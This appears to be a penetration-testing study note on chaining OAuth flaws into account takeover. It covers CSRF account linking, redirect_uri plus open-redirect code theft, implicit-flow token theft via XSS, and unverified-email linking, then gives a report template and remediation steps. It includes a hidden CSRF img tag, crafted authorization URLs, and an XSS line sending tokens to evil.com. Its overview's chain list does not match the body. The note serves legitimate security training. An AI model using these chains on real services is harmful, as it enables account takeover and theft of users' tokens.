---
tags: [vapt, oauth, advanced]
difficulty: advanced
module: "19 - OAuth"
topic: "19.18 OAuth to Account Takeover Chain"
portswigger_labs: ["OAuth account takeover via redirect_uri", "Forced OAuth profile linking"]
---

# 19.18 — OAuth to Account Takeover Chain

## The Big Picture

```
INDIVIDUAL OAUTH BUGS ARE OFTEN "MEDIUM" SEVERITY
CHAINED TOGETHER = ACCOUNT TAKEOVER

COMMON CHAINS:

Chain A: State + Account Linking
  Missing state validation + Account linking = ATO via CSRF

Chain B: redirect_uri + Open Redirect + Code
  Loose redirect_uri validation + Open redirect = Code theft = ATO

Chain C: Implicit Flow + XSS + Token Theft
  Implicit flow + XSS on app = Token theft = ATO

Chain D: Weak Client Secret + Code Interception
  Exposed client secret + Intercepted code = Token exchange = ATO

Chain E: PKCE Downgrade + Code Interception
  Plain PKCE accepted + MITM/log access to auth URL = Code stolen = ATO
```

---

## Chain A: CSRF Account Takeover via Account Linking

```
PREREQUISITES:
  [1] App has "Link OAuth provider" feature (logged-in users)
  [2] No state parameter OR state not validated in linking callback

STEP-BY-STEP EXPLOIT:

ATTACKER SETUP:
  1. Attacker creates own account at target app
  2. Attacker initiates "Link Google" flow from their account
  3. Attacker authenticates with their own Google account
  4. Attacker pauses before completing → intercepts callback URL:
     https://target.com/oauth/link?code=ATTACKER_CODE&state=abc
  5. Attacker does NOT complete the linking

VICTIM TARGETING:
  6. Attacker crafts HTML page:
     <html><body>
       <img src="https://target.com/oauth/link?code=ATTACKER_CODE" width=0 height=0>
     </body></html>
  7. Attacker tricks victim (logged in to target.com) into visiting the page
     (email, social media, SMS, stored XSS...)
  
EXPLOITATION:
  8. Victim's browser (with active session) GETs the callback URL
  9. target.com processes: "Code for ATTACKER's Google linked to... current session"
  10. ATTACKER's Google identity is now linked to VICTIM's account!
  
PERSISTENCE:
  11. Attacker logs in via Google → lands in VICTIM's account!
  12. Even if victim changes password → attacker can still log in via Google!
  
WHAT TO REPORT:
  CVSS: HIGH (7.5+)
  "Account takeover via OAuth CSRF in account linking"
```

---

## Chain B: redirect_uri + Open Redirect = Code Theft = ATO

```
PREREQUISITES:
  [1] Auth server validates redirect_uri with prefix match (not exact)
  [2] Open redirect exists anywhere on the registered domain

STEP-BY-STEP EXPLOIT:

RECONNAISSANCE:
  1. Find registered redirect_uri: https://app.example.com/callback
  2. Confirm: auth server accepts https://app.example.com/* (prefix match)
     Test: redirect_uri=https://app.example.com/callback/anything → accepted!
  3. Find open redirect: https://app.example.com/goto?url=USER_INPUT
     Test: /goto?url=https://evil.com → redirects to evil.com → OPEN REDIRECT!

EXPLOIT SETUP:
  4. Set up attacker server at: https://evil.com (to receive the code)
     Server logs all incoming requests including URL parameters

CRAFTING ATTACK URL:
  5. Craft authorization URL:
     https://auth.example.com/oauth/authorize?
       client_id=APP_CLIENT_ID&
       redirect_uri=https://app.example.com/goto?url=https://evil.com&
       response_type=code&
       scope=email+profile&
       state=anything  (if state not validated by app)
  
  Note: redirect_uri = https://app.example.com/goto?url=https://evil.com
  → Auth server checks: starts with https://app.example.com/ → PASS!

DELIVERY:
  6. Attacker sends this URL to victim (phishing, shared link)
  7. Victim clicks → redirected to auth server → authenticates
  
EXPLOITATION:
  8. Auth server: user authenticated, redirect to:
     https://app.example.com/goto?url=https://evil.com&code=VICTIM_CODE&state=...
  9. App's /goto endpoint: receives request with code+state in URL parameters
  10. /goto redirects: https://evil.com?code=VICTIM_CODE&state=...
      AND sends Referer: https://app.example.com/goto?url=https://evil.com&code=VICTIM_CODE
  11. Attacker's evil.com receives code in both URL and Referer!

TOKEN EXCHANGE:
  12. Attacker exchanges code for token:
      POST /oauth/token {
        code=VICTIM_CODE, client_id=APP_CLIENT_ID, 
        client_secret=APP_CLIENT_SECRET, redirect_uri=SAME_AS_ORIGINAL
      }
  13. Gets VICTIM's access token!
  14. Uses token → full access to victim's account!
```

---

## Chain C: Implicit Flow + XSS = Token Theft = ATO

```
PREREQUISITES:
  [1] App uses Implicit flow (response_type=token)
  [2] XSS exists anywhere the access token is accessible from

ATTACK:
  1. Access token returned in URL fragment: #access_token=TOKEN
  2. JavaScript reads it: const token = location.hash.split('=')[1]
  3. JS stores token: localStorage.setItem('token', token)
  4. XSS payload: fetch(`https://evil.com?t=${localStorage.getItem('token')}`)
  5. Attacker receives token → uses token → account access!
  
WHY ESPECIALLY DANGEROUS:
  localStorage persists until explicitly cleared
  → XSS executed any time → token still there!
  → Even if victim closed tab → token in localStorage!
```

---

## Chain D: Email-Based Account Linking + Unverified Email = ATO

```
PREREQUISITES:
  [1] App links accounts by email from OAuth provider
  [2] App trusts email_verified: false from OAuth provider
      OR: App uses OAuth provider that allows unverified emails

ATTACK:
  1. Attacker knows victim's email: victim@gmail.com
  2. Attacker controls a custom OAuth provider (or uses one with unverified emails)
  3. Attacker authenticates via OAuth with email=victim@gmail.com, email_verified=false
  4. App: "Someone logging in with Google email victim@gmail.com"
  5. App: "We have an account with this email → link/login!"
  6. Attacker → in victim's account!

REAL SCENARIO:
  Pre-account takeover:
  1. Attacker registers a custom OpenID Connect provider
  2. Sets up: attacker controls email claims
  3. Target app allows "Login with custom OIDC"
  4. Attacker claims: email=victim@target-company.com
  5. Target app creates/links account → ATO!
```

---

## Writing the Exploit Chain in a Report

```
REPORT STRUCTURE FOR CHAINED VULNERABILITIES:

Title: Account Takeover via OAuth Redirect URI Manipulation and Open Redirect

Severity: High

Vulnerability 1: Loose redirect_uri Validation (prefix match)
  - Location: /oauth/authorize endpoint
  - Evidence: [screenshot of request/response]

Vulnerability 2: Open Redirect at /goto endpoint
  - Location: https://app.example.com/goto?url=
  - Evidence: [screenshot of redirect to evil.com]

Attack Chain:
  1. [step 1]
  2. [step 2]
  ...

Impact:
  Full account takeover of any user who clicks the attacker-crafted link.
  Attacker can access [list of resources].

Proof of Concept:
  1. Set up attacker server at https://attacker.example.com
  2. Craft URL: [full crafted URL]
  3. [complete steps]
  4. Token received: [redacted evidence]
  5. API call as victim: [evidence]

Remediation:
  1. Enforce exact redirect_uri match
  2. Fix open redirect at /goto (allowlist-based)
  3. [additional steps]
```

---

## Quick Reference: ATO Chain Checklist

```
BEFORE CLAIMING ATO, VERIFY EACH STEP:

□ Can I craft an auth URL that sends code to my server?
  (redirect_uri bypass OR open redirect OR wildcard)
  
□ Can I deliver this URL to a victim?
  (Phishing? Stored XSS on target? Shared links?)
  
□ Can I receive the code at my server?
  (Test with Burp Collaborator or own server)
  
□ Can I exchange the code for a token?
  (Need client_secret? Can I find it?)
  
□ Can I authenticate as the victim with the token?
  (Test access to API, account profile, etc.)
  
□ Does the token expire quickly? (Still enough time for real attack?)

ALL BOXES CHECKED → FULL ATO → HIGH SEVERITY!
```

---

## Related Notes
- [[06 - OAuth State Parameter — CSRF in OAuth]] — state parameter CSRF
- [[07 - Redirect URI Manipulation]] — redirect_uri bypass
- [[08 - Open Redirect in Redirect URI]] — open redirect chaining
- [[12 - Account Linking Abuse]] — account linking CSRF
- [[03 - Implicit Flow Vulnerabilities]] — implicit flow risks
- [[20 - Defense Strict Redirect URI PKCE State Validation]] — full fix
